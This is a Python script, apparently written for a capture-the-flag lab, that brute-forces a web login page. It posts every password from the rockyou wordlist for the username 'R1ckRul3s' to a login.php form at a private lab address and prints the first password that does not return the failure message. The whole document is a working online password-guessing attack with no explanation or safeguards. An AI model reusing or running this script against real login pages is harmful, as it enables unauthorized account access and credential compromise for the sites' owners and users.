#!/usr/bin/env python3
import requests

WORDLIST_PATH = '/usr/share/wordlists/rockyou.txt'
LOGIN_URL = 'http://10.10.240.104/login.php'
USERNAME = 'R1ckRul3s'
FAIL_TEXT = 'Invalid username or password.'

wordlist = open(WORDLIST_PATH, 'r', encoding = "ISO-8859-1").readlines()

res = requests.post(LOGIN_URL, data={
    'username': USERNAME,
    'password': 'password',
    'sub': 'Login'
})

print('Starting bruteforce...')

count = 1
for w in wordlist:
    word = w.replace('\n', '')
    perc = 100 * (count / len(wordlist))
    print('Trying "{}" - {} / {} - {:.5f}%'.format(word, count, len(wordlist), perc))
    
    res = requests.post(LOGIN_URL, data={
        'username': USERNAME,
        'password': word,
        'sub': 'Login'
    })

    if FAIL_TEXT not in res.text:
        print(word)
        print('\n')
        print(res.text)
        break

    count += 1

print('Done')

